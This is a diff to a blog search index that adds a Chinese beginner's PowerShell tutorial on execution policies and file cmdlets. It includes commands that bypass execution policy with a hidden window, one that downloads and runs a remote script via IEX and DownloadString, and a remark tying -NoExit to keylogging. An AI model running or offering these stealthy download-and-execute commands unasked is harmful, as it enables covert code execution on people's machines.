@@ -2,7 +2,43 @@
 <search>
   <entry>
     <title>sunflower</title>
-    <url>/sunflower/</url>
-    <content><![CDATA[]]></content>
+    <url>/PowerShell/</url>
+    <content><![CDATA[<h3 id="PowerShell入门学习"><a href="#PowerShell入门学习" class="headerlink" title="PowerShell入门学习"></a><strong>PowerShell入门学习</strong></h3><h4 id="PowerShell简介"><a href="#PowerShell简介" class="headerlink" title="PowerShell简介"></a>PowerShell简介</h4><p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用. NET Framework的强大功能。它的脚本后缀为.ps1。PowerShell脚本可以运行在内存中，不需要写入磁盘。</p>
+<h4 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h4><p><strong>查询当前执行策略</strong>：Get-ExecutionPolicy</p>
+<p><img src="D:\blog\source_posts\image-20210819111702942.png" alt="image-20210819111702942"></p>
+<p><strong>执行策略：</strong>powershell有四种执行策略</p>
+<p>1、Restricted：脚本不能运行（默认设置）。</p>
+<p>2、RemoteSigned：本地创建的脚本可运行，从网上下载的不能运行（拥有数字签名的除外）</p>
+<p>3、AllSigned：仅当脚本由受信任的发布者签名时才能运行。</p>
+<p>4、Unrestricted：允许所有的脚本运行。</p>
+<p><strong>设置当前执行策略：</strong>Set-ExecutionPolicy <policy name>（以管理员身份执行）</p>
+<p><strong>运行脚本：</strong>当前目录下./name.ps1运行    其他目录以绝对路径运行</p>
+<p><strong>绕过本地权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1</p>
+<p><strong>本地隐藏绕过权限执行脚本：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile -File xxx.ps1</p>
+<p><strong>用IEX下载远程PS1脚本绕过权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(“xxx.ps1”);[Parameters]</p>
+<!--`ExecutionPolicy Bypass`绕过执行安全策略-->
+
+<!--`WindowStyle Hidden`隐藏窗口-->
+
+<!--NoProfile`PowerShell控制台不加载当前用户的配置文件-->
+
+<!--`NolLogo`启动不显示版权标志的PowerShell-->
+
+<!--`Nonlnteractive`非交互模式，PowerShell不为用户提供交互的提示-->
+
+<!--`Noexit`执行后不退出shell（常用于键盘记录）-->
+
+<!--PowerShell的命令都采用"动词+名词"的形式-->
+
+<p><strong>新建目录：</strong>md test （内部调用的是New-item命令)  /new-item test -type directory</p>
+<p><strong>新建文件：</strong>new-item test.txt -type file</p>
+<p><strong>删除目录：</strong>remove-item test</p>
+<p><strong>显示文本内容：</strong>set-content test.txt -value “Hello World!!!”（会覆盖掉原来的内容）</p>
+<p><strong>追加内容：</strong>add-content test.txt -value “Hello world!”</p>
+<p><strong>清除内容：</strong>clear-content test.txt</p>
+]]></content>
+      <tags>
+        <tag>powershell入门学习</tag>
+      </tags>
   </entry>
 </search>
